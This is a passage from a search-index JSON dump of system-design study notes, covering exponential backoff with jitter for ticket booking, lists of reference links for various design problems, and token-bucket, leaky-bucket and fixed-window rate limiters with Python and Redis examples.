\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba             \u2502\n  User\u2087 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba       \u2502  Server handles\n  User\u2088 \u2500\u2500\u2500\u2500\u2500\u2500\u25ba                 \u2502  manageable load\n  User\u2089 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba           \u2502\n  User\u2081\u2080 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba    \u2502\n\nResult: \u2705 Controlled Load Distribution\n</code></pre>"},{"location":"system-design/high-level/desgining/bookmyshow/#how-to-resolve-exponential-backoff-and-jitter","title":"How to Resolve: Exponential Backoff and Jitter","text":""},{"location":"system-design/high-level/desgining/bookmyshow/#1-exponential-backoff","title":"1. Exponential Backoff","text":"<p>Concept: When a request fails or needs to retry, wait for an exponentially increasing amount of time before the next attempt.</p> <p>Formula: <code>wait_time = base_delay \u00d7 2^(attempt_number)</code></p> <p>Example: - 1st retry: wait 1 second (1 \u00d7 2\u2070) - 2nd retry: wait 2 seconds (1 \u00d7 2\u00b9) - 3rd retry: wait 4 seconds (1 \u00d7 2\u00b2) - 4th retry: wait 8 seconds (1 \u00d7 2\u00b3) - 5th retry: wait 16 seconds (1 \u00d7 2\u2074)</p> <p>Pseudocode: <pre><code>def exponential_backoff(max_retries, base_delay=1):\n    for attempt in range(max_retries):\n        try:\n            response = book_ticket()\n            return response  # Success\n        except Exception as e:\n            if attempt == max_retries - 1:\n                raise  # Max retries exceeded\n\n            wait_time = base_delay * (2 ** attempt)\n            sleep(wait_time)\n</code></pre></p> <p>Problem with pure exponential backoff: If multiple clients start retrying at the same time, they'll all retry at the same exponentially increasing intervals, causing synchronized \"waves\" of requests.</p>"},{"location":"system-design/high-level/desgining/bookmyshow/#2-jitter-randomization","title":"2. Jitter (Randomization)","text":"<p>Concept: Add randomness to the retry delay to desynchronize retry attempts from different clients.</p> <p>Types of Jitter:</p> <p>a) Full Jitter (Recommended): <pre><code>wait_time = random(0, base_delay * 2^attempt)\n</code></pre></p> <p>b) Equal Jitter: <pre><code>temp = base_delay * 2^attempt\nwait_time = temp/2 + random(0, temp/2)\n</code></pre></p> <p>c) Decorrelated Jitter: <pre><code>wait_time = random(base_delay, previous_wait_time * 3)\n</code></pre></p>"},{"location":"system-design/high-level/desgining/bookmyshow/#3-complete-implementation","title":"3. Complete Implementation","text":"<pre><code>import random\nimport time\n\ndef book_ticket_with_backoff(\n    seat_id,\n    max_retries=5,\n    base_delay=0.1,\n    max_delay=32\n):\n    \"\"\"\n    Book ticket with exponential backoff and full jitter\n    \"\"\"\n    for attempt in range(max_retries):\n        try:\n            # Attempt to book the ticket\n            result = api.book_seat(seat_id)\n\n            if result.success:\n                return result\n\n            # If booking failed (seat taken, etc.)\n            if result.error_code == \"SEAT_TAKEN\":\n                return None  # Don't retry\n\n        except (ConnectionError, TimeoutError) as e:\n            if attempt == max_retries - 1:\n                raise  # Final attempt failed\n\n            # Calculate backoff with full jitter\n            exponential_delay = min(\n                base_delay * (2 ** attempt),\n                max_delay\n            )\n\n            # Full jitter: random between 0 and exponential_delay\n            jittered_delay = random.uniform(0, exponential_delay)\n\n            print(f\"Retry {attempt + 1}/{max_retries} \"\n                  f\"after {jittered_delay:.2f}s\")\n\n            time.sleep(jittered_delay)\n\n    return None  # All retries exhausted\n</code></pre>"},{"location":"system-design/high-level/desgining/bookmyshow/#4-additional-mitigation-strategies","title":"4. Additional Mitigation Strategies","text":"<p>Rate Limiting: <pre><code># Limit requests per user\n@rate_limit(max_requests=5, window=60)  # 5 requests per minute\ndef book_ticket_endpoint(user_id, seat_id):\n    return book_ticket(user_id, seat_id)\n</code></pre></p> <p>Queue-based System: <pre><code>Client \u2192 Load Balancer \u2192 API Gateway \u2192 Message Queue \u2192 Workers\n                                            \u2193\n                                      (Controlled rate)\n                                            \u2193\n                                        Database\n</code></pre></p> <p>Virtual Waiting Room: - Place users in a queue before allowing them to book - Release users gradually to the booking system - Show estimated wait time to manage expectations</p> <p>Caching with Lock: <pre><code>def get_seat_availability(show_id):\n    cache_key = f\"seats:{show_id}\"\n\n    # Try cache first\n    cached = redis.get(cache_key)\n    if cached:\n        return cached\n\n    # Use distributed lock to prevent thundering herd on cache miss\n    lock_key = f\"lock:{cache_key}\"\n\n    if redis.set(lock_key, \"1\", nx=True, ex=5):  # 5 second lock\n        try:\n            # Only one request regenerates cache\n            data = database.get_available_seats(show_id)\n            redis.setex(cache_key, 60, data)  # Cache for 60s\n            return data\n        finally:\n            redis.delete(lock_key)\n    else:\n        # Others wait and retry\n        time.sleep(random.uniform(0.01, 0.1))\n        return get_seat_availability(show_id)  # Recursive retry\n</code></pre></p> <p>Circuit Breaker: - Fail fast when system is overloaded - Prevent cascading failures - Allow system to recover</p> <p>Summary Table:</p> Strategy Purpose Effectiveness Exponential Backoff Spread retries over time \u2b50\u2b50\u2b50 Jitter Desynchronize clients \u2b50\u2b50\u2b50\u2b50\u2b50 Rate Limiting Control request rate \u2b50\u2b50\u2b50\u2b50 Queue System Sequential processing \u2b50\u2b50\u2b50\u2b50\u2b50 Virtual Waiting Room User management \u2b50\u2b50\u2b50\u2b50 Distributed Lock Prevent cache stampede \u2b50\u2b50\u2b50\u2b50 Circuit Breaker Fail fast protection \u2b50\u2b50\u2b50\u2b50"},{"location":"system-design/high-level/desgining/chat-system/","title":"Design a Chat System","text":""},{"location":"system-design/high-level/desgining/chat-system/#youtube","title":"Youtube","text":"<ul> <li>Build Scaleable Realtime Chat App with NextJS and NodeJS Tutorial</li> <li> <p>Build Scaleable Realtime Chat App with Kafka and Postgresql</p> </li> <li> <p>FAANG System Design Interview: Design A Chat System (WhatsApp, Facebook Messenger, Discord, Slack)</p> </li> </ul>"},{"location":"system-design/high-level/desgining/chat-system/#whatspp","title":"Whatspp","text":"<ul> <li>Whatsapp System Design | System Design Chat application | System design of Whatsapp application</li> </ul>"},{"location":"system-design/high-level/desgining/chess-game/","title":"Build a game of Chess","text":""},{"location":"system-design/high-level/desgining/chess-game/#youtube","title":"Youtube","text":"<ul> <li>Lichess founder Thibault Duplessis lectures on Lichess (2017)</li> <li>How 1 Software Engineer Outperforms 138 - Lichess Case Study</li> </ul>"},{"location":"system-design/high-level/desgining/data-warehouse/","title":"Design Data Warehouse","text":""},{"location":"system-design/high-level/desgining/data-warehouse/#youtube","title":"Youtube","text":"<ul> <li>Design a Data Warehouse | System Design</li> </ul>"},{"location":"system-design/high-level/desgining/distributed-geospatial-data-platform/","title":"Design a Distributed Geospatial Data Platform","text":""},{"location":"system-design/high-level/desgining/distributed-geospatial-data-platform/#youtube","title":"Youtube","text":"<ul> <li>Design a Distributed Geospatial Data Platform | System Design</li> </ul>"},{"location":"system-design/high-level/desgining/distributed-messaging-queue/","title":"Distributed Messaging Queue like Kafka, RabbitMQ","text":""},{"location":"system-design/high-level/desgining/distributed-messaging-queue/#youtube","title":"Youtube","text":"<ul> <li>16. System Design - Distributed Messaging Queue | Design Messaging Queue like Kafka, RabbitMQ</li> </ul>"},{"location":"system-design/high-level/desgining/e-commerce/","title":"Design E-commerce System","text":""},{"location":"system-design/high-level/desgining/e-commerce/#youtube","title":"Youtube","text":"<ul> <li>Design a Fault Tolerant E-commerce System | System Design</li> </ul>"},{"location":"system-design/high-level/desgining/ecommerce-checkout/","title":"Design E-commerce Checkout System","text":""},{"location":"system-design/high-level/desgining/ecommerce-checkout/#medium","title":"Medium","text":"<ul> <li>Building an E-commerce Checkout System: Distributed Transactions, Saga Patterns, and Reliability</li> </ul>"},{"location":"system-design/high-level/desgining/email-automation-platform/","title":"Design an Email Automation Platform (Klaviyo, Mailchimp)","text":""},{"location":"system-design/high-level/desgining/email-automation-platform/#youtube","title":"Youtube","text":"<ul> <li>Design an Email Automation Platform (Klaviyo, Mailchimp) | System Design</li> </ul>"},{"location":"system-design/high-level/desgining/food-delivery/","title":"Design Content Delivery Network","text":""},{"location":"system-design/high-level/desgining/food-delivery/#youtube","title":"Youtube","text":"<ul> <li>System Design Interview: Design Zomato | Swiggy | Uber Eats | DoorDash w/ a Senior Software Engineer</li> </ul>"},{"location":"system-design/high-level/desgining/google-drive/","title":"Design File sharing application (DropBox/Google Drive)","text":""},{"location":"system-design/high-level/desgining/google-drive/#youtube","title":"Youtube","text":"<ul> <li>Design Google Drive or Dropbox (Cloud File Sharing Service) | System Design Interview Prep</li> </ul>"},{"location":"system-design/high-level/desgining/hashtag-service/","title":"Design Tagging Service Or HashTag Service","text":""},{"location":"system-design/high-level/desgining/hashtag-service/#youtube","title":"Youtube","text":"<ul> <li>Tagging Service Or HashTag Service System Design | Atlassian interview question w/a Senior Software</li> </ul>"},{"location":"system-design/high-level/desgining/how-to-host-your-own-x/","title":"How to host your own X","text":""},{"location":"system-design/high-level/desgining/how-to-host-your-own-x/#youtube","title":"Youtube","text":"<ul> <li>Host Your Own Browser and OS</li> <li>Host Your Own Search Engine</li> </ul>"},{"location":"system-design/high-level/desgining/key-value-store/","title":"Key Value Store","text":"<p>Create a distributed key value store use golang and rust for writing different components and use helm for infrastructure using kubernetes stateful set</p>"},{"location":"system-design/high-level/desgining/key-value-store/#youtube","title":"Youtube","text":"<ul> <li>DESIGN A KEY-VALUE STORE | Amazon System Design Interview Quest. | HLD of Key-Value DB &amp; DynamoDB</li> </ul>"},{"location":"system-design/high-level/desgining/key-value-store/#github","title":"Github","text":"<ul> <li>Key Value Store</li> </ul>"},{"location":"system-design/high-level/desgining/large-language-model/","title":"Design Large Language Model (ChatGPT)","text":""},{"location":"system-design/high-level/desgining/large-language-model/#youtube","title":"Youtube","text":"<ul> <li>System Design Interview: Design Chatgpt or Large Language Model w/ a Senior Software Engineer</li> </ul>"},{"location":"system-design/high-level/desgining/leetcode/","title":"Leetcode Design","text":""},{"location":"system-design/high-level/desgining/leetcode/#youtube","title":"Youtube","text":"<ul> <li>System Design Interview: Design LeetCode w/ a Google Engineer</li> <li> <p>System Design Interview: Design LeetCode</p> </li> <li> <p>Design a Code Execution System | System Design</p> </li> </ul>"},{"location":"system-design/high-level/desgining/leetcode/#problems","title":"Problems","text":"<ul> <li>Design LeetCode</li> </ul>"},{"location":"system-design/high-level/desgining/leetcode/#scratchpad","title":"Scratchpad","text":"<pre><code>for code evaluation service there can be 2 possible ways\n\n1. use a message queue -&gt; code execution worker (n instances) -&gt; pick up the use code and the test cases and run it -&gt; save the results in evaluation database\n\n2. if it is a kubernetes service -&gt; spawn kubernetes job -&gt; use Kubernetes native Kueue to limit the number of jobs to be spawned -&gt; once the jobs are spawned then pick up the use code and the test cases and run it -&gt; save the results in evaluation database\n</code></pre>"},{"location":"system-design/high-level/desgining/live-comments/","title":"Design FB Live comments","text":""},{"location":"system-design/high-level/desgining/live-comments/#youtbe","title":"Youtbe","text":"<ul> <li>Design FB Live Comments: Hello Interview Mock</li> </ul>"},{"location":"system-design/high-level/desgining/log-system/","title":"Design Log System Data","text":""},{"location":"system-design/high-level/desgining/log-system/#youtube","title":"Youtube","text":"<ul> <li>Design a High-Throughput Logging System | System Design</li> </ul>"},{"location":"system-design/high-level/desgining/multiplayer-game/","title":"Design a Multiplayer Game (pubg)","text":""},{"location":"system-design/high-level/desgining/multiplayer-game/#youtube","title":"Youtube","text":"<ul> <li>System Design Interview: Design Multiplayer Game like PUBG Or BGMI w/ a Senior Software Engineer</li> </ul>"},{"location":"system-design/high-level/desgining/netflix/","title":"Netflix Design Choices","text":""},{"location":"system-design/high-level/desgining/netflix/#architechture-choices","title":"Architechture choices","text":""},{"location":"system-design/high-level/desgining/netflix/#youtube","title":"Youtube","text":"<ul> <li>Netflix is Built on Java</li> <li>How Netflix Uses Java - 2025 Edition</li> <li>Build GraphQL Services with Spring Boot like Netflix</li> <li>Paul Bakker \u2014 The DGS framework by Netflix \u2014 GraphQL for Spring Boot made easy</li> <li>How Netflix Really Uses Java</li> <li>AMA About the Java Language \u2014 Brian Goetz and Nicolai Parlog</li> </ul>"},{"location":"system-design/high-level/desgining/netflix/#medium","title":"Medium","text":"<ul> <li>How Java Powers Netflix's Backend Architecture (2025 Edition)</li> <li>The Netflix Tech Blog</li> <li> <p>Netflix Technology Blog</p> </li> <li> <p>Authorization</p> </li> <li> <p>Ipc</p> </li> <li> <p>Inside Netflix's Java Machine: GraphQL, ZGC, and the Art of Streaming at Planetary Scale</p> </li> <li>Netflix OSS and Spring Boot \u2014 Coming Full Circle</li> <li>Java 21 Virtual Threads - Dude, Where's My Lock?</li> <li> <p>Practical API Design at Netflix, Part 1: Using Protobuf FieldMask</p> </li> <li> <p>How Netflix Scales its API with GraphQL Federation (Part 1)</p> </li> <li>How Netflix Scales its API with GraphQL Federation (Part 2)</li> <li>A Tale of Two Frameworks: The Domain Graph Service Framework Meets Spring GraphQL</li> <li> <p>Open Sourcing the Netflix Domain Graph Service Framework: GraphQL for Spring Boot</p> </li> <li> <p>Mastering Netflix Archaius: A Deep Dive into Configuration Management for Scalable Applications</p> </li> <li>Mastering Spring Archaius: Revolutionize Your Spring Application Configuration</li> </ul>"},{"location":"system-design/high-level/desgining/netflix/#docs","title":"Docs","text":"<ul> <li>JEP 444: Virtual Threads</li> <li>Spectator Docs</li> <li>DGS | Domain Graph Service</li> <li>Intro to GraphQL with Java &amp; DGS</li> <li>Apollo Federation Subgraph Specification</li> </ul>"},{"location":"system-design/high-level/desgining/netflix/#blogs","title":"Blogs","text":"<ul> <li>An Introduction to Domain Graph Service (DGS) Framework</li> <li>Practical API Design Using gRPC at Netflix</li> <li>How Netflix Uses Java - 2025 Edition</li> <li>How Netflix Runs on Java: Modern Backend Engineering at Scale</li> <li>Netflix Java Tech Stack: Architectural Insights from GraphQL to gRPC</li> <li>New Trends in API Architecture: GraphQL and  gRPC</li> <li>How Netflix optimized its petabyte-scale logging system with ClickHouse</li> </ul>"},{"location":"system-design/high-level/desgining/netflix/#technologies","title":"Technologies","text":"<ul> <li>Spring Boot</li> <li>Spring Security</li> <li>gRPC, GraphQL</li> <li>Vaadin UI</li> </ul>"},{"location":"system-design/high-level/desgining/netflix/#authn-vs-authz","title":"Authn vs. authz","text":""},{"location":"system-design/high-level/desgining/notification-system/","title":"Design Notification System","text":""},{"location":"system-design/high-level/desgining/notification-system/#youtube","title":"Youtube","text":"<ul> <li>Scalable Notification System Design | Designing Scalable Systems</li> <li>Design Notifications System Design</li> </ul>"},{"location":"system-design/high-level/desgining/notification-system/#website","title":"Website","text":"<ul> <li>Notification System</li> </ul>"},{"location":"system-design/high-level/desgining/products/","title":"Products","text":""},{"location":"system-design/high-level/desgining/products/#contents","title":"Contents","text":""},{"location":"system-design/high-level/desgining/products/#system-design-case-studies","title":"System Design Case Studies","text":"<ul> <li>Design Vending Machine</li> <li>Design Facebook</li> <li>Design Distributed Job Scheduler</li> <li>Design Google Search</li> <li>Design a Digital Wallet</li> <li>Design Instagram</li> <li>Design Distributed Cache</li> <li>Design Uber</li> <li>Design Distributed Key-Value Store</li> <li>Design Notification Service</li> <li>Design Spotify</li> <li>Design Payment System</li> <li>Design Leaderboard</li> <li>Design File Sharing System like Dropbox</li> <li>Design Google Maps</li> <li>Design Distributed Counter</li> <li>Design WhatsApp</li> <li>Design Netflix</li> <li>Design TikTok</li> <li>Design Text Storage Service like Pastebin</li> <li>Design Rate Limiter</li> <li>Design E-commerce Store like Amazon</li> <li>Design Google Docs</li> <li>Design Live Comments</li> <li>Design Flight Booking System</li> <li>Design Content Delivery Network (CDN)</li> <li>Design Online Code Editor</li> <li>Design Autocomplete for Search Engines</li> <li>Design Food Delivery App like Doordash</li> <li>Design Authentication System</li> <li>Design Distributed Message Queue like Kafka</li> <li>Design Slack</li> <li>Design Distributed Locking Service</li> <li>Design Twitter</li> </ul>"},{"location":"system-design/high-level/desgining/products/#produc-designing","title":"Produc Designing","text":""},{"location":"system-design/high-level/desgining/products/#medium-blogs","title":"Medium blogs","text":"<ul> <li>I Built an App in 6 Hours that Makes $1,500/Mo</li> <li>How does URL shortening for TinyUrl, Bit.ly work?</li> <li>Day 2 \u2014 High Level System Design Series -How does YouTube stream millions of videos daily?</li> <li>booking.com<ul> <li>High-Level System Architecture of Booking.com</li> <li>High-Level System Architecture of Booking.com</li> </ul> </li> <li>airbnb<ul> <li>A Brief History of Airbnb's Architecture</li> <li>Airbnb Microservice Architecture</li> <li>How Airbnb Became a Leader in UX Design</li> </ul> </li> <li>My Interview Process with Mercedes-Benz for Drive Up'23 Software Development Internship</li> <li>Shopify's Journey of Handling Massive Flash Sales</li> <li>payment-system<ul> <li>UPI Payments Workflow</li> <li>Decoding Payment Gateways | Payment Gateway models</li> <li>Next-Gen Payment Gateway Aggregator Solution Architect Design</li> <li>The Magic Behind Apple Pay</li> <li>Idempotency Keys: How PayPal and Stripe Prevent Duplicate Payment</li> </ul> </li> <li>System Design for Advertisement Campagins</li> <li>Designing a Micro-blogging Platform \u2014 Scalable, Available, and Consistent</li> <li>System design: Google maps</li> <li>online-cab-booking<ul> <li>Design Uber</li> <li>An In-Depth Look at Pharos: Nearby Drivers Search System on Road Network at Scale</li> </ul> </li> <li>Design a Video Recommendation System | Instagram | Tiktok</li> <li>Design a Content Delivery Network (CDN)</li> <li>Design Youtube Streaming | Video Transcoding</li> <li>Instagram System Design Unraveled</li> <li>System Design Interview Question: Design Spotify</li> <li>tinder<ul> <li>Tinder \u2014 Fully explained System Design and Architecture</li> <li>How we built the Tinder API Gateway</li> <li>Tinder's move to Kubernetes</li> </ul> </li> <li>whatspp<ul> <li>System design: WhatsApp</li> <li>WhatsApp Architecture: Unveiling the Software Development Architecture</li> </ul> </li> <li>netflix<ul> <li>Microservices Lessons From Netflix</li> <li>Inside Netflix: A Deep Dive Into Its Cutting-Edge System Architecture</li> </ul> </li> <li>System design: Google Docs</li> <li>Exploring System Design: Instant Messaging Application</li> <li>System design: Instagram</li> <li>Designing a scheduled notification/reminder service with MongoDB</li> <li>Building a Rule-Based Alerting System</li> <li>Design A Notification System</li> <li>System design: Newsfeed System</li> <li>System Design for Logistics Management System</li> <li>System Design \u2014 A Deep Dive into the Food Ordering System</li> <li>System design: Twitter</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/","title":"Design Rate Limiter","text":""},{"location":"system-design/high-level/desgining/rate-limiter/#youtube","title":"Youtube","text":"<ul> <li> <p>Rate Limiter System Design: Token Bucket, Leaky Bucket, Scaling</p> </li> <li> <p>7: Design a Rate Limiter | Systems Design Interview Questions With Ex-Google SWE</p> </li> <li> <p>How to Implement Rate Limiting | Rate Limiting Strategies - System Design</p> </li> <li> <p>Master Rate Limiting - System Design</p> </li> <li> <p>Five Rate Limiting Algorithms ~ Key Concepts in System Design</p> </li> <li> <p>What is Rate Limiting / API Throttling? | System Design Concepts</p> </li> <li> <p>System Design Interview: Design a Distributed Rate Limiter w/ a Ex-Meta Staff Engineer</p> </li> <li> <p>Design a Rate Limiter</p> </li> <li> <p>Rate Limiting system design | TOKEN BUCKET, Leaky Bucket, Sliding Logs</p> </li> <li> <p>12. Design Rate Limiter | API Rate Limiter System Design | Rate Limiting Algorithms | Rate Limiter</p> </li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#website","title":"Website","text":"<ul> <li>Rate Limiter</li> <li>Design A Rate Limiter</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#blogs","title":"Blogs","text":"<ul> <li>Rate Limiting Fundamentals</li> <li>Rate Limiter For The Real World</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#designing","title":"Designing","text":""},{"location":"system-design/high-level/desgining/rate-limiter/#overview","title":"Overview","text":"<p>Rate limiting is a critical technique to control the rate of requests sent or received by a service. It protects against DDoS attacks, reduces costs, and prevents server overload. When a client exceeds the rate limit, the server returns HTTP Status Code 429 (Too Many Requests).</p> <p>Common use cases: - API throttling (e.g., Twitter API: 300 requests/15 minutes) - DDoS attack prevention - Cost control for third-party APIs - Resource management</p>"},{"location":"system-design/high-level/desgining/rate-limiter/#1-token-bucket-algorithm","title":"1. Token Bucket Algorithm","text":""},{"location":"system-design/high-level/desgining/rate-limiter/#description","title":"Description","text":"<p>The Token Bucket algorithm is one of the most popular rate limiting algorithms. Imagine a bucket that holds tokens. Each request consumes one token. Tokens are added to the bucket at a fixed rate. If the bucket is full, new tokens are discarded. When a request arrives, it checks if there's a token available. If yes, the request is processed and a token is removed. If no, the request is rejected.</p>"},{"location":"system-design/high-level/desgining/rate-limiter/#diagram","title":"Diagram","text":"<pre><code>Time: 0s      1s      2s      3s      4s\n      \u250c\u2500\u2510     \u250c\u2500\u2510     \u250c\u2500\u2510     \u250c\u2500\u2510     \u250c\u2500\u2510\n      \u25025\u2502 \u2192   \u25025\u2502 \u2192   \u25025\u2502 \u2192   \u25024\u2502 \u2192   \u25025\u2502\n      \u2514\u2500\u2518     \u2514\u2500\u2518     \u2514\u2500\u2518     \u2514\u2500\u2518     \u2514\u2500\u2518\nBucket (capacity=5, refill=1 token/sec)\n\nRequest at 3s \u2192 Token available \u2192 Accept (tokens: 5\u21924)\nRequest at 3.5s \u2192 Token available \u2192 Accept (tokens: 4\u21923)\n</code></pre>"},{"location":"system-design/high-level/desgining/rate-limiter/#advantages","title":"Advantages","text":"<ul> <li>Memory efficient - only needs to track token count and timestamp</li> <li>Allows burst traffic - clients can save up tokens for sudden spikes</li> <li>Easy to implement and understand</li> <li>Smooth traffic flow over time</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#disadvantages","title":"Disadvantages","text":"<ul> <li>Two parameters to tune (bucket size and refill rate)</li> <li>Difficult to tune parameters optimally for all scenarios</li> <li>May allow bursts that could overwhelm downstream services</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#implementation","title":"Implementation","text":"<p>Storage: Typically uses Redis for distributed systems (stores token count and last refill time)</p> <p>Configuration Parameters: - <code>bucket_capacity</code>: Maximum number of tokens (e.g., 10) - <code>refill_rate</code>: Tokens added per second (e.g., 1 token/sec)</p> <p>Ease of Implementation: \u2b50\u2b50\u2b50\u2b50 (4/5) - Easy to implement</p>"},{"location":"system-design/high-level/desgining/rate-limiter/#code-example","title":"Code Example","text":"<pre><code>import time\nimport redis\n\nclass TokenBucket:\n    def __init__(self, capacity, refill_rate, redis_client, key):\n        self.capacity = capacity\n        self.refill_rate = refill_rate  # tokens per second\n        self.redis = redis_client\n        self.key = key\n\n    def allow_request(self, tokens=1):\n        \"\"\"Check if request is allowed\"\"\"\n        now = time.time()\n\n        # Get current state from Redis\n        pipe = self.redis.pipeline()\n        pipe.get(f\"{self.key}:tokens\")\n        pipe.get(f\"{self.key}:last_refill\")\n        current_tokens, last_refill = pipe.execute()\n\n        # Initialize if first time\n        if current_tokens is None:\n            current_tokens = self.capacity\n            last_refill = now\n        else:\n            current_tokens = float(current_tokens)\n            last_refill = float(last_refill)\n\n        # Calculate tokens to add based on time elapsed\n        elapsed = now - last_refill\n        tokens_to_add = elapsed * self.refill_rate\n        current_tokens = min(self.capacity, current_tokens + tokens_to_add)\n\n        # Check if enough tokens\n        if current_tokens &gt;= tokens:\n            current_tokens -= tokens\n            # Update Redis\n            pipe = self.redis.pipeline()\n            pipe.set(f\"{self.key}:tokens\", current_tokens)\n            pipe.set(f\"{self.key}:last_refill\", now)\n            pipe.execute()\n            return True\n\n        return False\n\n# Usage\nredis_client = redis.Redis(host='localhost', port=6379)\nlimiter = TokenBucket(capacity=10, refill_rate=1, redis_client=redis_client, key=\"user:123\")\n\nif limiter.allow_request():\n    print(\"Request allowed\")\nelse:\n    print(\"Rate limit exceeded - 429\")\n</code></pre>"},{"location":"system-design/high-level/desgining/rate-limiter/#2-leaky-bucket-algorithm","title":"2. Leaky Bucket Algorithm","text":""},{"location":"system-design/high-level/desgining/rate-limiter/#description_1","title":"Description","text":"<p>The Leaky Bucket algorithm is similar to a bucket with a hole at the bottom. Requests enter the bucket as water. The bucket has a fixed capacity. Water leaks out of the bucket at a constant rate (processes requests). If the bucket is full when a request arrives, the request is rejected. This algorithm smooths out bursts and processes requests at a constant rate.</p>"},{"location":"system-design/high-level/desgining/rate-limiter/#diagram_1","title":"Diagram","text":"<pre><code>Incoming Requests (variable rate)\n         \u2193\u2193\u2193\n      \u250c\u2500\u2500\u2500\u2500\u2500\u2510\n      \u2502 \u2591\u2591\u2591 \u2502  \u2190 Bucket (Queue)\n      \u2502 \u2591\u2591\u2591 \u2502     Capacity: 5\n      \u2502 \u2591\u2591\u2591 \u2502\n      \u2514\u2500\u2500\u252c\u2500\u2500\u2518\n         \u2193 (constant outflow rate)\n    Processed Requests\n</code></pre>"},{"location":"system-design/high-level/desgining/rate-limiter/#advantages_1","title":"Advantages","text":"<ul> <li>Smooth and consistent output rate</li> <li>Memory efficient with fixed queue size</li> <li>Good for scenarios requiring stable outbound rate</li> <li>Simple to implement with a queue</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#disadvantages_1","title":"Disadvantages","text":"<ul> <li>A burst of traffic fills up the queue, and recent requests are rate limited</li> <li>Not suitable if requests need immediate processing</li> <li>Older requests in queue may become stale</li> <li>Difficult to tune bucket size appropriately</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#implementation_1","title":"Implementation","text":"<p>Storage: Uses Redis (stores queue of requests with timestamps)</p> <p>Configuration Parameters: - <code>bucket_capacity</code>: Maximum queue size (e.g., 100) - <code>outflow_rate</code>: Requests processed per second (e.g., 10/sec)</p> <p>Ease of Implementation: \u2b50\u2b50\u2b50 (3/5) - Moderate complexity</p>"},{"location":"system-design/high-level/desgining/rate-limiter/#code-example_1","title":"Code Example","text":"<pre><code>import time\nimport redis\nfrom collections import deque\n\nclass LeakyBucket:\n    def __init__(self, capacity, outflow_rate, redis_client, key):\n        self.capacity = capacity\n        self.outflow_rate = outflow_rate  # requests per second\n        self.redis = redis_client\n        self.key = key\n\n    def allow_request(self):\n        \"\"\"Check if request can be added to bucket\"\"\"\n        now = time.time()\n\n        # Get queue from Redis (stored as list)\n        queue = self.redis.lrange(f\"{self.key}:queue\", 0, -1)\n        queue = [float(ts) for ts in queue]\n\n        # Remove leaked (processed) requests\n        leaked_time = now - (len(queue) / self.outflow_rate)\n        queue = [ts for ts in queue if ts &gt; leaked_time]\n\n        # Check capacity\n        if len(queue) &lt; self.capacity:\n            # Add request to queue\n            self.redis.rpush(f\"{self.key}:queue\", now)\n            self.redis.ltrim(f\"{self.key}:queue\", -self.capacity, -1)\n            self.redis.expire(f\"{self.key}:queue\", 3600)  # 1 hour TTL\n            return True\n\n        return False\n\n# Usage\nredis_client = redis.Redis(host='localhost', port=6379)\nlimiter = LeakyBucket(capacity=100, outflow_rate=10, redis_client=redis_client, key=\"user:123\")\n\nif limiter.allow_request():\n    print(\"Request queued\")\nelse:\n    print(\"Bucket full - 429\")\n</code></pre>"},{"location":"system-design/high-level/desgining/rate-limiter/#3-fixed-window-counter-algorithm","title":"3. Fixed Window Counter Algorithm","text":""},{"location":"system-design/high-level/desgining/rate-limiter/#description_2","title":"Description","text":"<p>The Fixed Window Counter algorithm divides time into fixed-size windows (e.g., 1 minute) and maintains a counter for each window. When a request arrives, the algorithm increments the counter for the current window. If the counter exceeds the threshold, the request is rejected. At the start of a new window, the counter resets to zero.</p>"},{"location":"system-design/high-level/desgining/rate-limiter/#diagram_2","title":"Diagram","text":"<pre><code>Window 1       Window 2       Window 3\n(0-60s)        (60-120s)      (120-180s)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502Count: 8\u2502    \u2502Count: 5\u2502    \u2502Count: 3\u2502\n\u2502Limit:10\u2502    \u2502Limit:10\u2502    \u2502Limit:10\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n0s    60s    120s   180s\n\nIssue: Spike at window boundary\n    Window 1          Window 2\n      \u2193                 \u2193\n  \u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\n  50s-60s: 10 req  |  60s-70s: 10 req\n        = 20 requests in 20s! (2x limit)\n</code></pre>"},{"location":"system-design/high-level/desgining/rate-limiter/#advantages_2","title":"Advantages","text":"<ul> <li>Very simple to implement</li> <li>Memory efficient - stores only one counter per window</li> <li>Fast lookup and update</li> <li>Works well with Redis TTL</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#disadvantages_2","title":"Disadvantages","text":"<ul> <li>Boundary issue: Spike at window edges can exceed rate limit (2x the limit)</li> <li>Not smooth - resets abruptly at window boundaries</li> <li>Doesn't account for distribution within window</li> </ul>"},{"location":"system-design/high-level/desgining/rate-limiter/#implementation_2","title":"Implementation","text":"<p>Storage: Redis with key expiration</p> <p>Configuration Parameters: - <code>window_size</code>: Duration in seconds (e.g., 60) - <code>max_requests</code>: Maximum requests per window (e.g., 100)</p> <p>Ease of Implementation: \u2b50\u2b50\u2b50\u2b50\u2b50 (5/5) - Very easy to implement</p>"},{"location":"system-design/high-level/desgining/rate-limiter/#code-example_2","title":"Code Example","text":"<pre><code>import time\nimport redis\nimport math\n\nclass FixedWindowCounter:\n    def 